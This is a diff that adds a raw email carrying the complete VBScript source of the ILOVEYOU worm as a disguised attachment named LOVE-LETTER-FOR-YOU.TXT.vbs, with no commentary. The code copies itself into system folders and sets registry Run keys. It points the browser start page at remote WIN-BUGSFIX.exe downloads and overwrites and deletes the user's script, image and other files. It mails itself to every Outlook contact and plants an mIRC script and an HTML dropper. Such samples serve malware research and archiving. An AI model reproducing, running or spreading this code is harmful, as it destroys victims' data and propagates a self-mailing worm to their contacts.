@@ -1,0 +1,359 @@
+From: "Censored" <someone@somewhere.com>
+To: "Censored" <someone@somewhere.com>
+Subject: ILOVEYOU
+Date: Thu, 4 May 2000 11:40:49 +0100
+Message-ID: <NDBBLAPNCOFBABDJLLEAKEPBCAAA.alison@calcaphon.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0018_01BFB5BD.981124D0"
+X-Priority: 3 (Normal)
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook IMO, Build 9.0.2416 (9.0.2910.0)
+Importance: Normal
+X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2314.1300
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0018_01BFB5BD.981124D0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+
+kindly check the attached LOVELETTER coming from me.
+------=_NextPart_000_0018_01BFB5BD.981124D0
+Content-Type: application/octet-stream;
+	name="LOVE-LETTER-FOR-YOU.TXT.vbs"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+	filename="LOVE-LETTER-FOR-YOU.TXT.vbs"
+
+rem  barok -loveletter(vbe) <i hate go to school>
+rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  =
+Manila,Philippines
+On Error Resume Next
+dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
+eq=3D""
+ctr=3D0
+Set fso =3D CreateObject("Scripting.FileSystemObject")
+set file =3D fso.OpenTextFile(WScript.ScriptFullname,1)
+vbscopy=3Dfile.ReadAll
+main()
+sub main()
+On Error Resume Next
+dim wscr,rr
+set wscr=3DCreateObject("WScript.Shell")
+rr=3Dwscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows =
+Scripting Host\Settings\Timeout")
+if (rr>=3D1) then
+wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting =
+Host\Settings\Timeout",0,"REG_DWORD"
+end if
+Set dirwin =3D fso.GetSpecialFolder(0)
+Set dirsystem =3D fso.GetSpecialFolder(1)
+Set dirtemp =3D fso.GetSpecialFolder(2)
+Set c =3D fso.GetFile(WScript.ScriptFullName)
+c.Copy(dirsystem&"\MSKernel32.vbs")
+c.Copy(dirwin&"\Win32DLL.vbs")
+c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
+regruns()
+html()
+spreadtoemail()
+listadriv()
+end sub
+sub regruns()
+On Error Resume Next
+Dim num,downread
+regcreate =
+"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKerne=
+l32",dirsystem&"\MSKernel32.vbs"
+regcreate =
+"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices=
+\Win32DLL",dirwin&"\Win32DLL.vbs"
+downread=3D""
+downread=3Dregget("HKEY_CURRENT_USER\Software\Microsoft\Internet =
+Explorer\Download Directory")
+if (downread=3D"") then
+downread=3D"c:\"
+end if
+if (fileexist(dirsystem&"\WinFAT32.exe")=3D1) then
+Randomize
+num =3D Int((4 * Rnd) + 1)
+if num =3D 1 then
+regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start =
+Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmh=
+Pnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
+elseif num =3D 2 then
+regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start =
+Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwe=
+rWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
+elseif num =3D 3 then
+regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start =
+Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQ=
+ZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
+elseif num =3D 4 then
+regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start =
+Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDG=
+jkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-B=
+UGSFIX.exe"
+end if
+end if
+if (fileexist(downread&"\WIN-BUGSFIX.exe")=3D0) then
+regcreate =
+"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUG=
+SFIX",downread&"\WIN-BUGSFIX.exe"
+regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet =
+Explorer\Main\Start Page","about:blank"
+end if
+end sub
+sub listadriv
+On Error Resume Next
+Dim d,dc,s
+Set dc =3D fso.Drives
+For Each d in dc
+If d.DriveType =3D 2 or d.DriveType=3D3 Then
+folderlist(d.path&"\")
+end if
+Next
+listadriv =3D s
+end sub
+sub infectfiles(folderspec) =20
+On Error Resume Next
+dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
+set f =3D fso.GetFolder(folderspec)
+set fc =3D f.Files
+for each f1 in fc
+ext=3Dfso.GetExtensionName(f1.path)
+ext=3Dlcase(ext)
+s=3Dlcase(f1.name)
+if (ext=3D"vbs") or (ext=3D"vbe") then
+set ap=3Dfso.OpenTextFile(f1.path,2,true)
+ap.write vbscopy
+ap.close
+elseif(ext=3D"js") or (ext=3D"jse") or (ext=3D"css") or (ext=3D"wsh") or
+=
+(ext=3D"sct") or (ext=3D"hta") then
+set ap=3Dfso.OpenTextFile(f1.path,2,true)
+ap.write vbscopy
+ap.close
+bname=3Dfso.GetBaseName(f1.path)
+set cop=3Dfso.GetFile(f1.path)
+cop.copy(folderspec&"\"&bname&".vbs")
+fso.DeleteFile(f1.path)
+elseif(ext=3D"jpg") or (ext=3D"jpeg") then
+set ap=3Dfso.OpenTextFile(f1.path,2,true)
+ap.write vbscopy
+ap.close
+set cop=3Dfso.GetFile(f1.path)
+cop.copy(f1.path&".vbs")
+fso.DeleteFile(f1.path)
+elseif(ext=3D"mp3") or (ext=3D"mp2") then
+set mp3=3Dfso.CreateTextFile(f1.path&".vbs")
+mp3.write vbscopy
+mp3.close
+set att=3Dfso.GetFile(f1.path)
+att.attributes=3Datt.attributes+2
+end if
+if (eq<>folderspec) then
+if (s=3D"mirc32.exe") or (s=3D"mlink32.exe") or (s=3D"mirc.ini") or =
+(s=3D"script.ini") or (s=3D"mirc.hlp") then
+set scriptini=3Dfso.CreateTextFile(folderspec&"\script.ini")
+scriptini.WriteLine "[script]"
+scriptini.WriteLine ";mIRC Script"
+scriptini.WriteLine ";  Please dont edit this script... mIRC will =
+corrupt, if mIRC will"
+scriptini.WriteLine "     corrupt... WINDOWS will affect and will not =
+run correctly. thanks"
+scriptini.WriteLine ";"
+scriptini.WriteLine ";Khaled Mardam-Bey"
+scriptini.WriteLine ";http://www.mirc.com"
+scriptini.WriteLine ";"
+scriptini.WriteLine "n0=3Don 1:JOIN:#:{"
+scriptini.WriteLine "n1=3D  /if ( $nick =3D=3D $me ) { halt }"
+scriptini.WriteLine "n2=3D  /.dcc send $nick =
+"&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
+scriptini.WriteLine "n3=3D}"
+scriptini.close
+eq=3Dfolderspec
+end if
+end if
+next =20
+end sub
+sub folderlist(folderspec) =20
+On Error Resume Next
+dim f,f1,sf
+set f =3D fso.GetFolder(folderspec) =20
+set sf =3D f.SubFolders
+for each f1 in sf
+infectfiles(f1.path)
+folderlist(f1.path)
+next =20
+end sub
+sub regcreate(regkey,regvalue)
+Set regedit =3D CreateObject("WScript.Shell")
+regedit.RegWrite regkey,regvalue
+end sub
+function regget(value)
+Set regedit =3D CreateObject("WScript.Shell")
+regget=3Dregedit.RegRead(value)
+end function
+function fileexist(filespec)
+On Error Resume Next
+dim msg
+if (fso.FileExists(filespec)) Then
+msg =3D 0
+else
+msg =3D 1
+end if
+fileexist =3D msg
+end function
+function folderexist(folderspec)
+On Error Resume Next
+dim msg
+if (fso.GetFolderExists(folderspec)) then
+msg =3D 0
+else
+msg =3D 1
+end if
+fileexist =3D msg
+end function
+sub spreadtoemail()
+On Error Resume Next
+dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
+set regedit=3DCreateObject("WScript.Shell")
+set out=3DWScript.CreateObject("Outlook.Application")
+set mapi=3Dout.GetNameSpace("MAPI")
+for ctrlists=3D1 to mapi.AddressLists.Count
+set a=3Dmapi.AddressLists(ctrlists)
+x=3D1
+regv=3Dregedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
+if (regv=3D"") then
+regv=3D1
+end if
+if (int(a.AddressEntries.Count)>int(regv)) then
+for ctrentries=3D1 to a.AddressEntries.Count
+malead=3Da.AddressEntries(x)
+regad=3D""
+regad=3Dregedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malea=
+d)
+if (regad=3D"") then
+set male=3Dout.CreateItem(0)
+male.Recipients.Add(malead)
+male.Subject =3D "ILOVEYOU"
+male.Body =3D vbcrlf&"kindly check the attached LOVELETTER coming from =
+me."
+male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
+male.Send
+regedit.RegWrite =
+"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
+end if
+x=3Dx+1
+next
+regedit.RegWrite =
+"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
+else
+regedit.RegWrite =
+"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
+end if
+next
+Set out=3DNothing
+Set mapi=3DNothing
+end sub
+sub html
+On Error Resume Next
+dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
+dta1=3D"<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META =
+NAME=3D@-@Generator@-@ CONTENT=3D@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf&
+=
+_
+"<META NAME=3D@-@Author@-@ CONTENT=3D@-@spyder ?-? ispyder@mail.com ?-?
+=
+@GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
+"<META NAME=3D@-@Description@-@ CONTENT=3D@-@simple but i think this is
+=
+good...@-@>"&vbcrlf& _
+"<?-?HEAD><BODY =
+ONMOUSEOUT=3D@-@window.name=3D#-#main#-#;window.open(#-#LOVE-LETTER-FOR-Y=
+OU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
+"ONKEYDOWN=3D@-@window.name=3D#-#main#-#;window.open(#-#LOVE-LETTER-FOR-Y=
+OU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=3D@-@fixed@-@ =
+BGCOLOR=3D@-@#FF9933@-@>"&vbcrlf& _
+"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to =
+read this HTML file<BR>- Please press #-#YES#-# button to Enable =
+ActiveX<?-?p>"&vbcrlf& _
+"<?-?CENTER><MARQUEE LOOP=3D@-@infinite@-@ =
+BGCOLOR=3D@-@yellow@-@>----------z--------------------z----------<?-?MARQ=
+UEE> "&vbcrlf& _
+"<?-?BODY><?-?HTML>"&vbcrlf& _
+"<SCRIPT language=3D@-@JScript@-@>"&vbcrlf& _
+"<!--?-??-?"&vbcrlf& _
+"if (window.screen){var wi=3Dscreen.availWidth;var =
+hi=3Dscreen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcr=
+lf& _
+"?-??-?-->"&vbcrlf& _
+"<?-?SCRIPT>"&vbcrlf& _
+"<SCRIPT LANGUAGE=3D@-@VBScript@-@>"&vbcrlf& _
+"<!--"&vbcrlf& _
+"on error resume next"&vbcrlf& _
+"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
+"aw=3D1"&vbcrlf& _
+"code=3D"
+dta2=3D"set =
+fso=3DCreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
+"set dirsystem=3Dfso.GetSpecialFolder(1)"&vbcrlf& _
+"code2=3Dreplace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
+"code3=3Dreplace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
+"code4=3Dreplace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
+"set =
+wri=3Dfso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
+"wri.write code4"&vbcrlf& _
+"wri.close"&vbcrlf& _
+"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
+"if (err.number=3D424) then"&vbcrlf& _
+"aw=3D0"&vbcrlf& _
+"end if"&vbcrlf& _
+"if (aw=3D1) then"&vbcrlf& _
+"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
+"window.close"&vbcrlf& _
+"end if"&vbcrlf& _
+"end if"&vbcrlf& _
+"Set regedit =3D CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
+"regedit.RegWrite =
+@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-=
+^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
+"?-??-?-->"&vbcrlf& _
+"<?-?SCRIPT>"
+dt1=3Dreplace(dta1,chr(35)&chr(45)&chr(35),"'")
+dt1=3Dreplace(dt1,chr(64)&chr(45)&chr(64),"""")
+dt4=3Dreplace(dt1,chr(63)&chr(45)&chr(63),"/")
+dt5=3Dreplace(dt4,chr(94)&chr(45)&chr(94),"\")
+dt2=3Dreplace(dta2,chr(35)&chr(45)&chr(35),"'")
+dt2=3Dreplace(dt2,chr(64)&chr(45)&chr(64),"""")
+dt3=3Dreplace(dt2,chr(63)&chr(45)&chr(63),"/")
+dt6=3Dreplace(dt3,chr(94)&chr(45)&chr(94),"\")
+set fso=3DCreateObject("Scripting.FileSystemObject")
+set c=3Dfso.OpenTextFile(WScript.ScriptFullName,1)
+lines=3DSplit(c.ReadAll,vbcrlf)
+l1=3Dubound(lines)
+for n=3D0 to ubound(lines)
+lines(n)=3Dreplace(lines(n),"'",chr(91)+chr(45)+chr(91))
+lines(n)=3Dreplace(lines(n),"""",chr(93)+chr(45)+chr(93))
+lines(n)=3Dreplace(lines(n),"\",chr(37)+chr(45)+chr(37))
+if (l1=3Dn) then
+lines(n)=3Dchr(34)+lines(n)+chr(34)
+else
+lines(n)=3Dchr(34)+lines(n)+chr(34)&"&vbcrlf& _"
+end if
+next
+set b=3Dfso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
+b.close
+set d=3Dfso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
+d.write dt5
+d.write join(lines,vbcrlf)
+d.write vbcrlf
+d.write dt6
+d.close
+end sub
+------=_NextPart_000_0018_01BFB5BD.981124D0--
+
+
